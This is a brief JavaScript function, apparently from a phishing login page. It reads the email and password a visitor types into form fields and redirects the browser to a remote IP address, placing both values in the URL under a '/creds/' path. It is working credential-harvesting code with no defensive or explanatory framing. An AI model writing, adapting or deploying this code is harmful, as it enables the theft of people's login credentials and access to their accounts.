function enter() {
    var mail = document.getElementById("mail-inp").value;
    var password = document.getElementById("password-inp").value;

    console.log("Yeeah");

    window.location.href = `http://178.198.77.93:8000/creds/${mail}/${password}`
}